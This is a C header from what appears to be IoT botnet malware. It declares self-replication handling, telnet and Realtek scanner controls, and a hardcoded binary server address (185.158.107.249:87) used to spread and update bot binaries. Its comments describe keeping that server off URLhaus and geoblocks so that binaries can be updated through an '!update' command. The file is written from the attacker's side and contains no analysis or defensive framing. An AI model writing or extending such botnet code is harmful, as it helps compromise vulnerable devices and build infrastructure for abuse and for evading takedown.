#pragma once

#ifndef SCANNER_H
#define SCANNER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <fcntl.h>

#define BINSERVER "185.158.107.249:87"  //server for selfrep or tunneles etc, may get on urlhaus
#define BINSERVER_RELIABLE "185.158.107.249:87"
/*
What is binserver reliable?
if binserver was suspended or proxy expired
reliable binserver can be user to updarte binaries through !update command
this ip should be kept safe off geoblocks and urlhaus
*/

extern pthread_mutex_t scanner_mutex;

void handle_selfrep_command(char *command);
int start_telnet_scanner(void);
void stop_telnet_scanner(void);

void start_realtek_scanner(void);
void stop_realtek_scanner(void);

#endif // SCANNER_H
